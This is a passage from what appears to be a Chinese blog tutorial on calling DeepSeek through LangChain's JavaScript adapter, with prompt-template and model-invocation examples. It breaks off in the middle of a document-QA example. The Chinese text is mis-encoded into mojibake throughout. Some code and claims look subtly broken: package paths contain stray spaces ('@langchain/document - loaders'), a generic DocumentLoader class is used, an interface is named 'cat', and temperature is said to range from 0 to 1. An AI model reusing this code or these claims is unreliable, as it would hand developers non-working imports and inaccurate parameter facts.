<li><strong>é€‚é…å™¨æ¨¡å¼çš„å…³é”®ä½œç”¨</strong>ï¼šé€‚é…å™¨æ¨¡å¼æ˜¯ LangChain çš„ä¸€å¤§åˆ›æ–°äº®ç‚¹ã€‚ä¸åŒçš„å¤§æ¨¡å‹åœ¨æ¥å£è®¾è®¡ã€è¾“å…¥è¾“å‡ºæ ¼å¼ã€è°ƒç”¨æ–¹å¼ç­‰æ–¹é¢å­˜åœ¨æ˜¾è‘—å·®å¼‚ï¼Œè¿™ç»™å¼€å‘è€…å¸¦æ¥äº†é€‚é…çš„éš¾é¢˜ã€‚LangChain é€šè¿‡é€‚é…å™¨æ¥è§£å†³è¿™ä¸€é—®é¢˜ï¼Œä»¥Â <code>@langchain/deepseek</code>Â ä¸ºä¾‹ï¼Œå®ƒä½œä¸ºé’ˆå¯¹ DeepSeek æ¨¡å‹çš„é€‚é…å™¨ï¼Œè´Ÿè´£å¤„ç†ä¸ DeepSeek æ¨¡å‹äº¤äº’çš„åº•å±‚ç»†èŠ‚ã€‚é€‚é…å™¨å°† DeepSeek æ¨¡å‹çš„ç‰¹å®šæ¥å£è½¬æ¢ä¸º LangChain ç»Ÿä¸€çš„æ ‡å‡†æ¥å£ï¼Œä¸ºå¼€å‘è€…æä¾›äº†ä¸€ä¸ªç®€æ´ã€ä¸€è‡´ä¸”æ˜“äºä½¿ç”¨çš„ç¼–ç¨‹æ¥å£ã€‚è¿™æ„å‘³ç€å¼€å‘è€…æ— éœ€èŠ±è´¹å¤§é‡æ—¶é—´å’Œç²¾åŠ›å»ç ”ç©¶æ¯ä¸ªæ¨¡å‹çš„ç‰¹å®šæ¥å£ï¼Œå¤§å¤§é™ä½äº†å¼€å‘æˆæœ¬ï¼Œæé«˜äº†å¼€å‘æ•ˆç‡ã€‚æ­¤å¤–ï¼Œé€‚é…å™¨æ¨¡å¼è¿˜ä½¿å¾— LangChain èƒ½å¤Ÿå…¼å®¹å¤šç§ä¸åŒç±»å‹çš„å¤§æ¨¡å‹ï¼ŒåŒ…æ‹¬ OpenAI çš„ GPT ç³»åˆ—ã€è°·æ­Œçš„ PaLM ç­‰ï¼Œè¿›ä¸€æ­¥æ‹“å®½äº†å…¶åº”ç”¨èŒƒå›´ã€‚</li>
<li><strong>ç»Ÿä¸€æ¥å£å¸¦æ¥çš„ä¾¿åˆ©</strong>ï¼šLangChain ä¸ºä¼—å¤šå¤§æ¨¡å‹æä¾›äº†ç»Ÿä¸€çš„æ¥å£ï¼Œå¦‚Â <code>completion</code>Â å’ŒÂ <code>cat</code>ã€‚è¿™äº›ç»Ÿä¸€æ¥å£æŠ½è±¡äº†ä¸åŒæ¨¡å‹çš„å·®å¼‚ï¼Œä½¿å¾—å¼€å‘è€…å¯ä»¥ä½¿ç”¨ç›¸åŒçš„æ–¹å¼è°ƒç”¨å„ç§æ¨¡å‹ï¼Œå®ç°æ–‡æœ¬ç”Ÿæˆã€é—®ç­”ã€æ‘˜è¦ç­‰åŠŸèƒ½ã€‚è¿™ç§ä¸€è‡´æ€§æå¤§åœ°ç®€åŒ–äº†å¼€å‘æµç¨‹ï¼Œå¼€å‘è€…å¯ä»¥æ›´åŠ ä¸“æ³¨äºåº”ç”¨é€»è¾‘çš„å®ç°ï¼Œè€Œä¸å¿…æ‹…å¿ƒåº•å±‚æ¨¡å‹çš„å…·ä½“å®ç°ç»†èŠ‚ã€‚ä¾‹å¦‚ï¼Œæ— è®ºä½¿ç”¨çš„æ˜¯ OpenAI çš„ GPT - 3.5 è¿˜æ˜¯ DeepSeek çš„æ¨¡å‹ï¼Œå¼€å‘è€…éƒ½å¯ä»¥é€šè¿‡ç±»ä¼¼çš„æ¥å£è°ƒç”¨æ–¹å¼å®ç°æ–‡æœ¬ç”Ÿæˆä»»åŠ¡ï¼Œåªéœ€æ ¹æ®å…·ä½“éœ€æ±‚è°ƒæ•´å‚æ•°å³å¯ã€‚åŒæ—¶ï¼Œç»Ÿä¸€æ¥å£ä¹Ÿæ–¹ä¾¿äº†åœ¨ä¸åŒæ¨¡å‹ä¹‹é—´è¿›è¡Œåˆ‡æ¢å’Œå¯¹æ¯”å®éªŒï¼Œæœ‰åŠ©äºå¼€å‘è€…é€‰æ‹©æœ€é€‚åˆç‰¹å®šä»»åŠ¡çš„æ¨¡å‹ã€‚</li>
</ol>
<h2 data-id="heading-4">äºŒã€LangChain ä»£ç ç¤ºä¾‹æ·±åº¦è§£æ</h2>
<h3 data-id="heading-5">ï¼ˆä¸€ï¼‰Demo1 è¯¦ç»†å‰–æ</h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä»ç¯å¢ƒå˜é‡ä¸­åŠ è½½é…ç½®</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'dotenv/config'</span>; 
<span class="hljs-comment">// å¯¼å…¥é’ˆå¯¹ DeepSeek æ¨¡å‹çš„é€‚é…å™¨</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ChatDeepSeek</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/deepseek'</span>; 
<span class="hljs-comment">// å¯¼å…¥æç¤ºè¯æ¨¡æ¿æ¨¡å—</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">PromptTemplate</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/core/prompts'</span>; 

<span class="hljs-comment">// åˆ›å»ºæç¤ºè¯æ¨¡æ¿</span>
<span class="hljs-keyword">const</span> prompt = <span class="hljs-title class_">PromptTemplate</span>.<span class="hljs-title function_">fromTemplate</span>(<span class="hljs-string">`
  ä½ æ˜¯ä¸€ä¸ª{role}ï¼Œ
  è¯·ç”¨ä¸è¶…è¿‡{limit}ä¸ªå­—ç¬¦å›ç­”ä»¥ä¸‹é—®é¢˜ï¼š
  {question}  
`</span>);

<span class="hljs-comment">// å¡«å……æ¨¡æ¿ç”Ÿæˆå…·ä½“æç¤ºè¯</span>
<span class="hljs-comment">// const promptStr = await prompt.format({</span>
<span class="hljs-comment">//   role: 'å¨å¸ˆ',</span>
<span class="hljs-comment">//   limit: 100,</span>
<span class="hljs-comment">//   question: 'ä½ å¥½ï¼Œè¯·é—®å¦‚ä½•åˆ¶ä½œçº¢çƒ§è‚‰ã€‚',</span>
<span class="hljs-comment">// });</span>
<span class="hljs-keyword">const</span> prompt2 = <span class="hljs-keyword">await</span> prompt.<span class="hljs-title function_">format</span>({
  <span class="hljs-attr">role</span>: <span class="hljs-string">'ä¸“ä¸šç¿»è¯‘'</span>,
  <span class="hljs-attr">limit</span>: <span class="hljs-number">10</span>,
  <span class="hljs-attr">question</span>: <span class="hljs-string">'ä½ å¥½è¯·ç¿»è¯‘ï¼Œæˆ‘æƒ³çŸ¥é“ä½ æ˜¯ç”·æ˜¯å¥³ã€‚'</span>,
});
<span class="hljs-comment">// console.log(promptStr, prompt2);  </span>

<span class="hljs-comment">// åˆå§‹åŒ– DeepSeek æ¨¡å‹å®ä¾‹</span>
<span class="hljs-keyword">const</span> model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChatDeepSeek</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">'deepseek-reasoner'</span>,
  <span class="hljs-attr">temperature</span>: <span class="hljs-number">1</span>,
});

<span class="hljs-comment">// è°ƒç”¨æ¨¡å‹å¹¶è·å–ç»“æœ</span>
<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> model.<span class="hljs-title function_">invoke</span>(prompt2);
<span class="hljs-comment">// è¾“å‡ºæ¨¡å‹ç”Ÿæˆå†…å®¹çš„ content éƒ¨åˆ†</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">content</span>); 
</code></pre>
<ol>
<li>
<p><strong>ç¯å¢ƒå˜é‡åŠ è½½</strong>ï¼šä»£ç å¼€ç¯‡çš„Â <code>import 'dotenv/config';</code>Â è¯­å¥è‡³å…³é‡è¦ï¼Œå®ƒè´Ÿè´£ä»ç¯å¢ƒå˜é‡ä¸­åŠ è½½é…ç½®ä¿¡æ¯ã€‚åœ¨å®é™…å¼€å‘ä¸­ï¼Œè¯¸å¦‚ API å¯†é’¥ã€æ¨¡å‹ç‰¹å®šå‚æ•°ç­‰æ•æ„Ÿä¿¡æ¯é€šå¸¸ä¼šå­˜å‚¨åœ¨ç¯å¢ƒå˜é‡ä¸­ã€‚é€šè¿‡è¿™ç§æ–¹å¼åŠ è½½é…ç½®ï¼Œæ—¢èƒ½ä¿è¯ä»£ç çš„å®‰å…¨æ€§ï¼Œé˜²æ­¢æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œåˆæ–¹ä¾¿åœ¨ä¸åŒç¯å¢ƒï¼ˆå¦‚å¼€å‘ã€æµ‹è¯•ã€ç”Ÿäº§ï¼‰ä¸­è¿›è¡Œçµæ´»é…ç½®ã€‚ä¾‹å¦‚ï¼Œåœ¨å¼€å‘ç¯å¢ƒä¸­ï¼Œå¯ä»¥ä½¿ç”¨æœ¬åœ°ç¯å¢ƒå˜é‡è¿›è¡Œè°ƒè¯•ï¼Œè€Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œåˆ™å¯ä»¥é€šè¿‡æœåŠ¡å™¨çš„ç¯å¢ƒå˜é‡é…ç½®æ¥éƒ¨ç½²åº”ç”¨ï¼Œæ— éœ€ä¿®æ”¹ä»£ç ä¸­çš„ç¡¬ç¼–ç ã€‚</p>
</li>
<li>
<p><strong>æ¨¡å—å¯¼å…¥</strong>ï¼š</p>
<ul>
<li><code>import { ChatDeepSeek } from '@langchain/deepseek';</code>Â è¿™è¡Œä»£ç å¯¼å…¥äº†Â <code>ChatDeepSeek</code>ï¼Œå®ƒæ˜¯ LangChain é’ˆå¯¹ DeepSeek æ¨¡å‹çš„é€‚é…å™¨ã€‚å€ŸåŠ©è¿™ä¸ªé€‚é…å™¨ï¼Œå¼€å‘è€…å¯ä»¥è½»æ¾ä¸ DeepSeek æ¨¡å‹è¿›è¡Œäº¤äº’ï¼Œå……åˆ†åˆ©ç”¨è¯¥æ¨¡å‹åœ¨è‡ªç„¶è¯­è¨€å¤„ç†æ–¹é¢çš„å¼ºå¤§åŠŸèƒ½ã€‚ä¸åŒçš„é€‚é…å™¨é’ˆå¯¹ä¸åŒçš„æ¨¡å‹è¿›è¡Œäº†ä¼˜åŒ–ï¼Œç¡®ä¿ä¸ LangChain æ¡†æ¶çš„æ— ç¼é›†æˆã€‚</li>
<li><code>import { PromptTemplate } from '@langchain/core/prompts';</code>Â å¼•å…¥äº†Â <code>PromptTemplate</code>Â æ¨¡å—ï¼Œå®ƒæ˜¯ LangChain æç¤ºè¯ç®¡ç†çš„æ ¸å¿ƒç»„ä»¶ã€‚æç¤ºè¯åœ¨ä¸å¤§æ¨¡å‹äº¤äº’ä¸­èµ·ç€å…³é”®ä½œç”¨ï¼Œä¸€ä¸ªç²¾å¿ƒè®¾è®¡çš„æç¤ºè¯èƒ½å¤Ÿå¼•å¯¼æ¨¡å‹ç”Ÿæˆæ›´ç¬¦åˆéœ€æ±‚çš„å†…å®¹ã€‚<code>PromptTemplate</code>Â æä¾›äº†ä¸€ç§ä¾¿æ·çš„æ–¹å¼æ¥åˆ›å»ºå’Œç®¡ç†æç¤ºè¯æ¨¡æ¿ï¼Œé€šè¿‡æ¨¡æ¿å ä½ç¬¦ï¼Œå¼€å‘è€…å¯ä»¥çµæ´»åœ°æ„å»ºé€šç”¨çš„æç¤ºè¯æ¡†æ¶ï¼Œå¹¶æ ¹æ®ä¸åŒçš„ä»»åŠ¡åœºæ™¯å¡«å……å…·ä½“çš„å‚æ•°ã€‚</li>
</ul>
</li>
<li>
<p><strong>æç¤ºè¯æ¨¡æ¿åˆ›å»º</strong>ï¼š</p>
<ul>
<li><code>const prompt = PromptTemplate.fromTemplate(</code>...<code>);</code>Â ä½¿ç”¨Â <code>PromptTemplate</code>Â çš„é™æ€æ–¹æ³•Â <code>fromTemplate</code>Â åˆ›å»ºäº†ä¸€ä¸ªæç¤ºè¯æ¨¡æ¿ã€‚è¿™ä¸ªæ¨¡æ¿é€šè¿‡å ä½ç¬¦Â <code>{role}</code>ã€<code>{limit}</code>Â å’ŒÂ <code>{question}</code>Â æ„å»ºäº†ä¸€ä¸ªé€šç”¨çš„æé—®æ¡†æ¶ã€‚å…¶ä¸­ï¼Œ<code>{role}</code>Â å¯ä»¥è®¾å®šæ¨¡å‹æ‰®æ¼”çš„è§’è‰²ï¼Œå¦‚å¨å¸ˆã€åŒ»ç”Ÿã€å¾‹å¸ˆç­‰ï¼Œä¸åŒçš„è§’è‰²è®¾å®šä¼šå¼•å¯¼æ¨¡å‹ä»ä¸åŒçš„ä¸“ä¸šè§’åº¦è¿›è¡Œå›ç­”ï¼›<code>{limit}</code>Â ç”¨äºé™åˆ¶å›ç­”çš„å­—ç¬¦é•¿åº¦ï¼Œè¿™åœ¨ä¸€äº›å¯¹è¾“å‡ºé•¿åº¦æœ‰ä¸¥æ ¼è¦æ±‚çš„åœºæ™¯ä¸­éå¸¸æœ‰ç”¨ï¼Œæ¯”å¦‚çŸ­ä¿¡å›å¤ã€ç¤¾äº¤åª’ä½“å¸–å­ç­‰ï¼›<code>{question}</code>Â åˆ™ä¸ºå…·ä½“çš„é—®é¢˜å†…å®¹ã€‚é€šè¿‡è¿™ç§æ¨¡æ¿åŒ–çš„æ–¹å¼ï¼Œå¼€å‘è€…å¯ä»¥æ ¹æ®ä¸åŒçš„ä»»åŠ¡å’Œæ¨¡å‹ç‰¹ç‚¹ï¼Œå®šåˆ¶åŒ–ç”Ÿæˆé«˜è´¨é‡çš„æç¤ºè¯ï¼Œæé«˜æ¨¡å‹ç”Ÿæˆç»“æœçš„å‡†ç¡®æ€§å’Œå®ç”¨æ€§ã€‚</li>
<li>è™½ç„¶ä»£ç ä¸­éƒ¨åˆ†å¡«å……æ¨¡æ¿çš„ä»£ç è¢«æ³¨é‡Šæ‰ï¼Œä½†ä»Â <code>const prompt2 = await prompt.format({... });</code>Â å¯ä»¥æ¸…æ™°åœ°çœ‹åˆ°ï¼Œ<code>format</code>Â æ–¹æ³•ç”¨äºå°†å®é™…çš„å€¼å¡«å……åˆ°æ¨¡æ¿çš„å ä½ç¬¦ä¸­ã€‚è¿™é‡Œå°†Â <code>role</code>Â è®¾ç½®ä¸º â€œä¸“ä¸šç¿»è¯‘â€ï¼Œ<code>limit</code>Â è®¾ç½®ä¸º â€œ10â€ï¼Œ<code>question</code>Â è®¾ç½®ä¸º â€œä½ å¥½è¯·ç¿»è¯‘ï¼Œæˆ‘æƒ³çŸ¥é“ä½ æ˜¯ç”·æ˜¯å¥³ã€‚â€ï¼Œä»è€Œç”Ÿæˆäº†ä¸€ä¸ªé’ˆå¯¹ç¿»è¯‘éœ€æ±‚çš„å…·ä½“æç¤ºè¯Â <code>prompt2</code>ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¼€å‘è€…å¯ä»¥æ ¹æ®å…·ä½“ä»»åŠ¡éœ€æ±‚ï¼ŒåŠ¨æ€åœ°è°ƒæ•´è¿™äº›å‚æ•°ï¼Œä»¥è·å–æœ€é€‚åˆçš„æç¤ºè¯ã€‚ä¾‹å¦‚ï¼Œåœ¨å¤„ç†å¤šè¯­è¨€ç¿»è¯‘ä»»åŠ¡æ—¶ï¼Œå¯ä»¥æ ¹æ®æºè¯­è¨€å’Œç›®æ ‡è¯­è¨€çš„ç‰¹ç‚¹ï¼Œè°ƒæ•´æç¤ºè¯ä¸­çš„è§’è‰²è®¾å®šå’Œé—®é¢˜è¡¨è¿°ï¼Œæé«˜ç¿»è¯‘è´¨é‡ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ¨¡å‹åˆå§‹åŒ–</strong>ï¼š<code>const model = new ChatDeepSeek({... });</code>Â åˆ›å»ºäº†Â <code>ChatDeepSeek</code>Â æ¨¡å‹çš„å®ä¾‹ï¼Œå¹¶å¯¹å…¶è¿›è¡Œåˆå§‹åŒ–é…ç½®ã€‚è®¾ç½®Â <code>model</code>Â ä¸ºÂ <code>'deepseek - reasoner'</code>ï¼ŒæŒ‡å®šä½¿ç”¨ DeepSeek æ¨¡å‹çš„ç‰¹å®šç‰ˆæœ¬æˆ–æ¨¡å¼ï¼›<code>temperature</code>Â è®¾ç½®ä¸ºÂ <code>1</code>ï¼Œ<code>temperature</code>Â æ˜¯æ§åˆ¶æ¨¡å‹ç”Ÿæˆæ–‡æœ¬éšæœºæ€§çš„é‡è¦å‚æ•°ï¼Œå–å€¼èŒƒå›´é€šå¸¸åœ¨ 0 åˆ° 1 ä¹‹é—´ã€‚å½“Â <code>temperature</code>Â æ¥è¿‘ 1 æ—¶ï¼Œæ¨¡å‹ç”Ÿæˆçš„æ–‡æœ¬æ›´åŠ éšæœºã€å¤šæ ·åŒ–ï¼Œå¯èƒ½ä¼šäº§ç”Ÿä¸€äº›æ–°é¢–ä½†ä¸å¤ªç¡®å®šçš„ç»“æœï¼Œé€‚ç”¨äºåˆ›æ„å†™ä½œã€å¤´è„‘é£æš´ç­‰åœºæ™¯ï¼Œä¾‹å¦‚ç”Ÿæˆæ•…äº‹åˆ›æ„ã€è¯—æ­Œåˆ›ä½œç­‰ï¼›è€Œå½“Â <code>temperature</code>Â æ¥è¿‘ 0 æ—¶ï¼Œç”Ÿæˆçš„æ–‡æœ¬æ›´åŠ ç¡®å®šæ€§å’Œä¿å®ˆï¼Œæ›´å€¾å‘äºé‡å¤å·²çŸ¥çš„æ¨¡å¼å’Œä¿¡æ¯ï¼Œé€‚ç”¨äºå¯¹å‡†ç¡®æ€§è¦æ±‚è¾ƒé«˜çš„åœºæ™¯ï¼Œå¦‚ä¸“ä¸šæ–‡æ¡£ç”Ÿæˆã€äº‹å®æ€§é—®ç­”ç­‰ã€‚</p>
</li>
<li>
<p><strong>æ¨¡å‹è°ƒç”¨ä¸ç»“æœè¾“å‡º</strong>ï¼š<code>const res = await model.invoke(prompt2);</code>Â é€šè¿‡Â <code>invoke</code>Â æ–¹æ³•è°ƒç”¨å·²åˆå§‹åŒ–çš„æ¨¡å‹ï¼Œå¹¶ä¼ å…¥ç”Ÿæˆçš„æç¤ºè¯Â <code>prompt2</code>ã€‚æ¨¡å‹æ ¹æ®æç¤ºè¯è¿›è¡Œåˆ†æå’Œç”Ÿæˆï¼Œæœ€ç»ˆè¿”å›ç»“æœã€‚<code>invoke</code>Â æ–¹æ³•æ˜¯ LangChain ä¸æ¨¡å‹äº¤äº’çš„æ ¸å¿ƒæ–¹æ³•ä¹‹ä¸€ï¼Œå®ƒè´Ÿè´£å°†æç¤ºè¯ä¼ é€’ç»™æ¨¡å‹ï¼Œå¹¶å¤„ç†æ¨¡å‹è¿”å›çš„ç»“æœã€‚<code>console.log(res.content);</code>Â åˆ™å°†æ¨¡å‹ç”Ÿæˆå†…å®¹çš„Â <code>content</code>Â éƒ¨åˆ†è¾“å‡ºåˆ°æ§åˆ¶å°ï¼Œæ–¹ä¾¿å¼€å‘è€…æŸ¥çœ‹å’Œè¿›ä¸€æ­¥å¤„ç†ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œå¼€å‘è€…å¯èƒ½ä¼šå¯¹è¿”å›çš„ç»“æœè¿›è¡Œæ›´å¤šçš„å¤„ç†ï¼Œå¦‚æå–å…³é”®ä¿¡æ¯ã€è¿›è¡Œæ ¼å¼è½¬æ¢ã€ä¸å…¶ä»–æ•°æ®è¿›è¡Œæ•´åˆç­‰ï¼Œä»¥æ»¡è¶³å…·ä½“ä¸šåŠ¡éœ€æ±‚ã€‚</p>
</li>
</ol>
<h3 data-id="heading-6">ï¼ˆäºŒï¼‰ç¬¬äºŒä¸ªç¤ºä¾‹è§£è¯»</h3>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä»ç¯å¢ƒå˜é‡ä¸­åŠ è½½é…ç½®</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'dotenv/config'</span>; 
<span class="hljs-comment">// console.log(process.env.DEEPSEEK_API_KEY, '//////');</span>
<span class="hljs-comment">// å¯¼å…¥é’ˆå¯¹ DeepSeek æ¨¡å‹çš„é€‚é…å™¨</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">ChatDeepSeek</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/deepseek'</span>; 

<span class="hljs-comment">// åˆå§‹åŒ– DeepSeek æ¨¡å‹å®ä¾‹</span>
<span class="hljs-keyword">const</span> model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChatDeepSeek</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-string">'deepseek-reasoner'</span>,
  <span class="hljs-attr">temperature</span>: <span class="hljs-number">0</span>,
  <span class="hljs-comment">// langchain å¸®æˆ‘ä»¬é€‚é…äº†å¸‚é¢ä¸Šå¤§éƒ¨åˆ†çš„å¤§æ¨¡å‹</span>
  <span class="hljs-comment">// baseURL ä¸ç”¨ é€‚é…å™¨æ¨¡å¼  Provider</span>
  <span class="hljs-comment">// apiKey ä»ç¯å¢ƒå˜é‡ä¸­è·å–</span>
});
<span class="hljs-comment">// è°ƒç”¨æ¨¡å‹å¹¶è·å–ç»“æœ</span>
<span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> model.<span class="hljs-title function_">invoke</span>(<span class="hljs-string">'ç”¨ä¸€å¥è¯è§£é‡Šä»€ä¹ˆæ˜¯ langchainï¼Ÿ'</span>);
<span class="hljs-comment">// è¾“å‡ºæ¨¡å‹ç”Ÿæˆå†…å®¹çš„ content éƒ¨åˆ†</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res.<span class="hljs-property">content</span>);
</code></pre>
<ol>
<li><strong>ç¯å¢ƒå˜é‡ä¸æ¨¡å‹å¯¼å…¥</strong>ï¼šä¸ç¬¬ä¸€ä¸ªç¤ºä¾‹ç›¸ä¼¼ï¼Œå†æ¬¡é€šè¿‡Â <code>import 'dotenv/config';</code>Â åŠ è½½ç¯å¢ƒå˜é‡ï¼Œç¡®ä¿é…ç½®ä¿¡æ¯çš„å¯ç”¨æ€§ã€‚éšåå¯¼å…¥Â <code>ChatDeepSeek</code>Â æ¨¡å‹ï¼Œä¸ºåç»­ä½¿ç”¨ DeepSeek æ¨¡å‹è¿›è¡Œå‡†å¤‡ã€‚åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œè¿™ä¸€æ­¥éª¤ç¡®ä¿äº†æ¨¡å‹èƒ½å¤Ÿæ­£ç¡®è¿æ¥åˆ°ç›¸åº”çš„æœåŠ¡ï¼Œå¹¶è·å–æ‰€éœ€çš„æƒé™å’Œå‚æ•°ã€‚</li>
<li><strong>æ¨¡å‹åˆå§‹åŒ–ä¸å‚æ•°è°ƒæ•´</strong>ï¼š<code>const model = new ChatDeepSeek({... });</code>Â é‡æ–°åˆ›å»ºæ¨¡å‹å®ä¾‹ï¼Œä½†è¿™æ¬¡å°†Â <code>temperature</code>Â è®¾ç½®ä¸ºÂ <code>0</code>ã€‚è¾ƒä½çš„Â <code>temperature</code>Â å€¼ä½¿å¾—æ¨¡å‹ç”Ÿæˆçš„æ–‡æœ¬æ›´åŠ ç¡®å®šå’Œä¿å®ˆï¼Œæ›´é€‚åˆå¯¹ç»“æœå‡†ç¡®æ€§è¦æ±‚è¾ƒé«˜ã€å¯¹éšæœºæ€§è¦æ±‚è¾ƒä½çš„åœºæ™¯ã€‚ä¾‹å¦‚ï¼Œåœ¨æ„å»ºä¸“ä¸šé¢†åŸŸçš„é—®ç­”ç³»ç»Ÿæ—¶ï¼Œç”¨æˆ·æœŸæœ›å¾—åˆ°å‡†ç¡®ã€æƒå¨çš„ç­”æ¡ˆï¼Œæ­¤æ—¶å°†Â <code>temperature</code>Â è®¾ç½®ä¸ºè¾ƒä½å€¼å¯ä»¥ç¡®ä¿æ¨¡å‹ç”Ÿæˆçš„å›ç­”æ›´ç¬¦åˆäº‹å®å’Œä¸“ä¸šçŸ¥è¯†ã€‚åˆå¦‚ï¼Œåœ¨ç”Ÿæˆæ³•å¾‹æ–‡ä»¶ã€ç§‘å­¦æŠ¥å‘Šç­‰å¯¹å‡†ç¡®æ€§å’Œè§„èŒƒæ€§è¦æ±‚æé«˜çš„æ–‡æ¡£æ—¶ï¼Œè¾ƒä½çš„Â <code>temperature</code>Â è®¾ç½®èƒ½å¤Ÿé¿å…æ¨¡å‹ç”Ÿæˆè¿‡äºéšæ„æˆ–é”™è¯¯çš„å†…å®¹ã€‚</li>
<li><strong>æ¨¡å‹è°ƒç”¨ä¸ç»“æœå±•ç¤º</strong>ï¼š<code>const res = await model.invoke('ç”¨ä¸€å¥è¯è§£é‡Šä»€ä¹ˆæ˜¯ langchainï¼Ÿ');</code>Â ç›´æ¥è°ƒç”¨Â <code>invoke</code>Â æ–¹æ³•ï¼Œå¹¶ä¼ å…¥ä¸€ä¸ªç®€æ´çš„é—®é¢˜ä½œä¸ºæç¤ºè¯ã€‚æ¨¡å‹åŸºäºè¯¥æç¤ºè¯è¿›è¡Œç†è§£å’Œç”Ÿæˆï¼Œæœ€åé€šè¿‡Â <code>console.log(res.content);</code>Â è¾“å‡ºæ¨¡å‹å¯¹ â€œç”¨ä¸€å¥è¯è§£é‡Šä»€ä¹ˆæ˜¯ langchainï¼Ÿâ€ è¿™ä¸ªé—®é¢˜çš„å›ç­”å†…å®¹ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œè¿™ç§ç®€å•ç›´æ¥çš„è°ƒç”¨æ–¹å¼é€‚ç”¨äºå¿«é€Ÿè·å–ä¿¡æ¯æˆ–è¿›è¡Œç®€å•çš„æ–‡æœ¬ç”Ÿæˆä»»åŠ¡ã€‚ç„¶è€Œï¼Œå¯¹äºæ›´å¤æ‚çš„ä»»åŠ¡ï¼Œå¼€å‘è€…å¯èƒ½éœ€è¦å¯¹æç¤ºè¯è¿›è¡Œæ›´ç²¾ç»†çš„è®¾è®¡ï¼Œæˆ–è€…ç»“åˆå…¶ä»– LangChain ç»„ä»¶ï¼Œå¦‚æ–‡æ¡£æ£€ç´¢ã€ä¸Šä¸‹æ–‡ç®¡ç†ç­‰ï¼Œä»¥è·å¾—æ›´æ»¡æ„çš„ç»“æœã€‚</li>
</ol>
<h3 data-id="heading-7">ï¼ˆä¸‰ï¼‰LangChain çš„å…¶ä»–å¸¸è§åº”ç”¨åœºæ™¯åŠä»£ç ç¤ºä¾‹</h3>
<ol>
<li><strong>æ–‡æ¡£é—®ç­”ç³»ç»Ÿ</strong>ï¼šåœ¨å¤„ç†æ–‡æ¡£é—®ç­”ä»»åŠ¡æ—¶ï¼ŒLangChain å¯ä»¥ç»“åˆæ–‡æ¡£åŠ è½½å™¨ã€æ–‡æœ¬åˆ†å‰²å™¨ã€åµŒå…¥ç”Ÿæˆå™¨å’Œæ£€ç´¢å™¨ç­‰ç»„ä»¶ï¼Œå®ç°ä»æ–‡æ¡£ä¸­æå–ç›¸å…³ä¿¡æ¯å¹¶å›ç­”ç”¨æˆ·é—®é¢˜çš„åŠŸèƒ½ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€åŒ–çš„ä»£ç ç¤ºä¾‹ï¼š</li>
</ol>
<p>javascript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">DocumentLoader</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/document - loaders'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">RecursiveCharacterTextSplitter</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/text - splitters'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">OpenAIEmbeddings</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/embeddings/openai'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Chroma</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/vectorstores/chroma'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">RetrievalQA</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/retrievers'</span>;

<span class="hljs-comment">// åŠ è½½æ–‡æ¡£</span>
<span class="hljs-keyword">const</span> loader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DocumentLoader</span>(<span class="hljs-string">'path/to/your/document.pdf'</span>);
<span class="hljs-keyword">const</span> docs = <span class="hljs-keyword">await</span> loader.<span class="hljs-title function_">load</span>();

<span class="hljs-comment">// åˆ†å‰²æ–‡æœ¬</span>
<span class="hljs-keyword">const</span> textSplitter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RecursiveCharacterTextSplitter</span>({ <span class="hljs-attr">chunkSize</span>: <span class="hljs-number">1000</span> });
<span class="hljs-keyword">const</span> splitDocs = <span class="hljs-keyword">await</span> textSplitter.<span class="hljs-title function_">splitDocuments</span>(docs);

<span class="hljs-comment">// ç”ŸæˆåµŒå…¥</span>
<span class="hljs-keyword">const</span> embeddings = <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAIEmbeddings</span>();
<span class="hljs-keyword">const</span> vectorStore = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Chroma</span>.<span class="hljs-title function_">fromDocuments</span>(splitDocs, embeddings);

<span class="hljs-comment">// åˆ›å»ºæ£€ç´¢å™¨</span>
<span class="hljs-keyword">const</span> retriever = vectorStore.<span class="hljs-title function_">asRetriever</span>();

<span class="hljs-comment">// åˆ›å»ºé—®ç­”ç³»ç»Ÿ</span>
<span class="hljs-keyword">const</span> qa = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RetrievalQA</span>({ retriever });

